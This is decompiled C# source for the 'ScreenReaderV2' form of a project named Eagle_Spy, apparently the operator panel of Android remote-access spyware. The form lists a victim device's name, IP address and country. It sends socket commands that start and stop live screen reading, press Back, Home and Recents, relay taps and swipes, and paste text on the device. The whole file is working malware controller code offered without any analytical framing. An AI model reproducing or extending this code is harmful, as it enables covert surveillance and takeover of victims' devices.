using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000A2 RID: 162
	[DesignerGenerated]
	public partial class ScreenReaderV2 : Form
	{
		// Token: 0x06000872 RID: 2162 RVA: 0x000D190C File Offset: 0x000CFB0C
		public ScreenReaderV2()
		{
			base.Load += this.ScreenReaderV2_Load;
			base.FormClosing += this.ScreenReaderV2_FormClosing;
			this.isclick = false;
			this.Swaping = false;
			this.isdown = false;
			this.ScreenShotFoucs = false;
			this.Recordit = false;
			this.Rnew = 0;
			this.Title = "null";
			this.tiks = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000873 RID: 2163 RVA: 0x000D1988 File Offset: 0x000CFB88
		private void ScreenReaderV2_Load(object sender, EventArgs e)
		{
			try
			{
				this.ClientPic.Image = this.classClient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.classClient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.classClient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.classClient.Country
				});
				if (this.classClient != null)
				{
					TcpClient myClient = this.classClient.myClient;
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"SCRD2<*>o",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000874 RID: 2164 RVA: 0x00002423 File Offset: 0x00000623
		private void Savetimer_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000875 RID: 2165 RVA: 0x00004C2E File Offset: 0x00002E2E
		private void Presstimer_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.tiks++;
			}
		}

		// Token: 0x06000876 RID: 2166 RVA: 0x0003BF0C File Offset: 0x0003A10C
		public string asab(string input)
		{
			string[] array = input.Replace("\u200b", " ").Split(new char[] { ' ' });
			string text = "";
			string[] array2 = array;
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				if (text2.Length > 0)
				{
					text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
				}
			}
			return text;
		}

		// Token: 0x06000877 RID: 2167 RVA: 0x000D1B40 File Offset: 0x000CFD40
		private void Enablebtn_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD2<*>o",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
		}

		// Token: 0x06000878 RID: 2168 RVA: 0x00004C3E File Offset: 0x00002E3E
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			this.viewpic.Image = Codes.BlankImage();
		}

		// Token: 0x06000879 RID: 2169 RVA: 0x000D1C58 File Offset: 0x000CFE58
		private void Disablebtn_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD2<*>f",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
		}

		// Token: 0x0600087A RID: 2170 RVA: 0x000D1D70 File Offset: 0x000CFF70
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Bc",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600087B RID: 2171 RVA: 0x000D1E98 File Offset: 0x000D0098
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Ho",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600087C RID: 2172 RVA: 0x000D1FC0 File Offset: 0x000D01C0
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>RC",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600087D RID: 2173 RVA: 0x00002423 File Offset: 0x00000623
		private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600087E RID: 2174 RVA: 0x00002423 File Offset: 0x00000623
		private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600087F RID: 2175 RVA: 0x00002423 File Offset: 0x00000623
		private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000880 RID: 2176 RVA: 0x000D20E8 File Offset: 0x000D02E8
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			this.ScreenShotFoucs = false;
			if (e.Button == MouseButtons.Left)
			{
				this.Trakpoint = new List<Point>();
				this.Trakpoint.Add(new Point(e.X, e.Y));
				this.isclick = false;
				this.isdown = true;
				return;
			}
			this.presstimer.Enabled = true;
			this.isclick = true;
		}

		// Token: 0x06000881 RID: 2177 RVA: 0x00004C50 File Offset: 0x00002E50
		private void Viewpic_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isdown)
			{
				this.Swaping = true;
				this.isclick = false;
				this.Trakpoint.Add(new Point(e.X, e.Y));
			}
		}

		// Token: 0x06000882 RID: 2178 RVA: 0x000D2154 File Offset: 0x000D0354
		private void Viewpic_MouseUp(object sender, MouseEventArgs e)
		{
			this.isdown = false;
			int width = this.viewpic.Width;
			int height = this.viewpic.Height;
			checked
			{
				if (this.isclick)
				{
					this.presstimer.Enabled = false;
					this.presstimer.Stop();
					string text = "clk:";
					if (this.tiks > 3)
					{
						text = "clk:hold:";
					}
					this.tiks = 0;
					Point point = this.viewpic.PointToClient(Control.MousePosition);
					Point point2 = new Point((int)Math.Round(unchecked((double)point.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.ScreenSize.Height / (double)height))));
					text = text + point2.X.ToString() + ":" + point2.Y.ToString();
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
					return;
				}
				if (!this.Swaping)
				{
					return;
				}
				this.Swaping = false;
				this.Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point point3 in this.Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point3.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point3.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
				}
				string[] array3 = this.classClient.Keys.Split(new char[] { ':' });
				object[] array4 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						stringBuilder.ToString(),
						Data.SPL_SOCKET,
						array3[0],
						Data.SPL_SOCKET,
						array3[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array4);
			}
		}

		// Token: 0x06000883 RID: 2179 RVA: 0x000D1C58 File Offset: 0x000CFE58
		private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD2<*>f",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
		}

		// Token: 0x06000884 RID: 2180 RVA: 0x000D251C File Offset: 0x000D071C
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (this.classClient != null && this.textsend.Text.Length > 0)
			{
				object[] array = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"pst<*>",
						this.textsend.Text,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
				this.textsend.Text = "";
			}
		}

		// Token: 0x06000885 RID: 2181 RVA: 0x000D264C File Offset: 0x000D084C
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>En",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000886 RID: 2182 RVA: 0x000D1FC0 File Offset: 0x000D01C0
		private void Button7_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>RC",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000887 RID: 2183 RVA: 0x000D1E98 File Offset: 0x000D0098
		private void Button6_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Ho",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000888 RID: 2184 RVA: 0x000D1D70 File Offset: 0x000CFF70
		private void Button5_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				try
				{
					string[] array = this.classClient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.classClient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>Bc",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000889 RID: 2185 RVA: 0x000D251C File Offset: 0x000D071C
		private void Enterbutton_Click(object sender, EventArgs e)
		{
			if (this.classClient != null && this.textsend.Text.Length > 0)
			{
				object[] array = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"pst<*>",
						this.textsend.Text,
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						"0",
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
				this.textsend.Text = "";
			}
		}

		// Token: 0x0600088A RID: 2186 RVA: 0x000D1B40 File Offset: 0x000CFD40
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[] { ':' });
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD2<*>o",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array2);
			}
		}

		// Token: 0x040009CC RID: 2508
		private bool isclick;

		// Token: 0x040009CD RID: 2509
		private bool Swaping;

		// Token: 0x040009CE RID: 2510
		private bool isdown;

		// Token: 0x040009CF RID: 2511
		private List<Point> Trakpoint;

		// Token: 0x040009D0 RID: 2512
		public TcpClient Client;

		// Token: 0x040009D1 RID: 2513
		public Client ScreenClass;

		// Token: 0x040009D2 RID: 2514
		public Client classClient;

		// Token: 0x040009D3 RID: 2515
		public string DownloadsFolder;

		// Token: 0x040009D4 RID: 2516
		public string RecordName;

		// Token: 0x040009D5 RID: 2517
		public Size ScreenSize;

		// Token: 0x040009D6 RID: 2518
		public bool LIVE;

		// Token: 0x040009D7 RID: 2519
		public bool ScreenShotFoucs;

		// Token: 0x040009D8 RID: 2520
		public bool Recordit;

		// Token: 0x040009D9 RID: 2521
		public int Rnew;

		// Token: 0x040009DA RID: 2522
		public string Title;

		// Token: 0x040009DB RID: 2523
		private int tiks;
	}
}
